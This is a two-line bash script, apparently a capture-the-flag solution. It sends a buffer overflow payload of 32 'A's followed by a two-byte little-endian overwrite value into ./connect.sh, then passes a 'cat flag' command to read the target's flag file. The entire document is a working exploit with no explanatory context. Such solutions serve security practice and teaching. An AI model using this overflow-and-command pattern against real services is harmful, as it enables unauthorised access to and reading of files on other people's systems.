#!/bin/bash
python -c "print 'A'*32+'\x12\x34'[::-1]+'\ncat flag'"|./connect.sh
